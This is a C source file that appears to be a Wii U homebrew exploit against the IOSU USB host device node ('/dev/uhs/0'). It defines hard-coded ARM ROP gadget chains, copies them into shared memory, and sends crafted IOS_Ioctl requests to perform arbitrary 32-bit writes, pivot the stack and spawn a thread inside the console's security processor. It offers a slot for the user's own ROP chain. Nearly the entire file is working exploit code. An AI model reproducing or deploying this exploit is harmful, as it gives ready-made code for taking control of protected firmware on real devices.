//Main.c
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <malloc.h>
#include <unistd.h>
#include "dynamic_libs/os_functions.h"
#include "dynamic_libs/fs_functions.h"
#include "dynamic_libs/gx2_functions.h"
#include "dynamic_libs/sys_functions.h"
#include "dynamic_libs/vpad_functions.h"
#include "dynamic_libs/padscore_functions.h"
#include "dynamic_libs/socket_functions.h"
#include "dynamic_libs/ax_functions.h"
#include "fs/fs_utils.h"
#include "fs/sd_fat_devoptab.h"
#include "system/memory.h"
#include "utils/logger.h"
#include "utils/utils.h"
#include "common/common.h"
#include "main.h"

#define CHAIN_START         0x1016AD40
#define SHUTDOWN         0x1012EE4C
#define SIMPLE_RETURN      0x101014E4
#define SOURCE            (0x120000)
#define IOS_CREATETHREAD   0x1012EABC

int dev_uhs_0_handle;

/* YOUR ROP CHAIN HERE (copied to 0x1015BD78) */
/* The one here is just an example */
int final_chain[] = {
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SIMPLE_RETURN,
	SHUTDOWN,
};

int second_chain[] = {
	0x10123a9f, // 0x00         POP {R0,R1,R4,PC}
	CHAIN_START + 0x14 + 0x4 + 0x20 - 0xF000,     // 0x04         destination
	0x0,        // 0x08         
	0x0,        // 0x0C         
	0x101063db, // 0x10         POP {R1,R2,R5,PC}
	0x00130000, // 0x14         source
	sizeof(final_chain),          // 0x18         length
	0x0,        // 0x1C         
	0x10106D4C, // 0x20         BL MEMCPY; MOV R0, #0; LDMFD SP!, {R4,R5,PC}
	0x0,        // 0x24         
	0x0,        // 0x28         
	0x101236f3, // 0x2C         POP {R1-R7,PC}
	0x0,        // 0x30         arg
	0x101001DC, // 0x34         stackptr
	0x68,       // 0x38         stacksize
	0x10101634, // 0x3C         proc: ADD SP, SP, #8; LDMFD SP!, {R4,R5,PC}
	0x0,        // 0x40
	0x0,        // 0x44
	0x0,        // 0x48
	0x1010388C, // 0x4C         CMP R3, #0; MOV R0, R4; LDMNEFD SP!, {R4,R5,PC}
	0x0,        // 0x50
	0x0,        // 0x54
	0x1012CFEC, // 0x58         MOV LR, R0; MOV R0, LR; ADD SP, SP, #8; LDMFD SP!, {PC}
	0x0,   // 0x5C
	0x0,        // 0x60
	IOS_CREATETHREAD, // 0x64   
	0x1,        // 0x68         priority
	0x2,        // 0x6C         flags
	0x0,        // 0x70
	0x0,        // 0x74
	0x101063db, // 0x78         POP {R1,R2,R5,PC}
	0x0,        // 0x7C         
	-(0x240 + 0xF000), // 0x80  stack offset
	0x0,        // 0x84         
	0x1011D424, // 0x88         LDMFD SP!, {R4-R11,PC}
	0x0,        // 0x8C         
	0x0,        // 0x90         
	0x0,        // 0x94         
	0x0,        // 0x98         
	0x0,        // 0x9C         
	0x0,        // 0xA0         
	0x0,        // 0xA4         
	0x4,        // 0xA8         R11 must equal 4 in order to pivot the stack
	0x1012EA68, // 0xAC         stack pivot
};

int Menu_Main(void) {
	//!---------INIT---------
	InitOSFunctionPointers();                  //! Init coreinit functions adresses
	dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);   //! Open /dev/uhs/0 IOS node
	uhs_exploit_init();                        //! Init variables for the exploit

											   //!------ROP CHAIN-------
	uhs_write32(CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
	uhs_write32(CHAIN_START + 0x10, 0x1011814C);
	uhs_write32(CHAIN_START + 0xC, SOURCE);

	uhs_write32(CHAIN_START, 0x1012392b); // pop {R4-R6,PC}

										  //!--------DEINIT--------
	IOS_Close(dev_uhs_0_handle);               //! Close /dev/uhs/0 IOS node
	return EXIT_SUCCESS;                     //! Exit from HBL
}

//!------Variables used in exploit------
int *pretend_root_hub = (int*)0xF5003ABC;
int *ayylmao = (int*)0xF4500000;
//!-------------------------------------

void uhs_exploit_init() {
	ayylmao[5] = 1;
	ayylmao[8] = 0x500000;

	memcpy((char*)(0xF4120000), second_chain, sizeof(second_chain));
	memcpy((char*)(0xF4130000), final_chain, sizeof(final_chain));

	pretend_root_hub[33] = 0x500000;
	pretend_root_hub[78] = 0;

	DCFlushRange(pretend_root_hub + 33, 200);      //! |Make CPU fetch new data (with updated vals)
	DCInvalidateRange(pretend_root_hub + 33, 200);   //! |for "pretend_root_hub"

	DCFlushRange((void*)0xF4120000, sizeof(second_chain));      //! |Make CPU fetch new data (with updated vals)
	DCInvalidateRange((void*)0xF4120000, sizeof(second_chain));   //! |for second chain inside MEM1
	DCFlushRange((void*)0xF4130000, sizeof(final_chain));      //! |Make CPU fetch new data (with updated vals)
	DCInvalidateRange((void*)0xF4130000, sizeof(final_chain));   //! |for final chain inside MEM1
}

int uhs_write32(int arm_addr, int val) {
	ayylmao[520] = arm_addr - 24;                  //!  The address to be overwritten, minus 24 bytes
	DCFlushRange(ayylmao, 521 * 4);                //! |Make CPU fetch new data (with updated adress)
	DCInvalidateRange(ayylmao, 521 * 4);           //! |for "ayylmao"
	OSSleepTicks(0x200000);                        //!  Improves stability
	int request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
	int output_buffer[32];
	return IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
}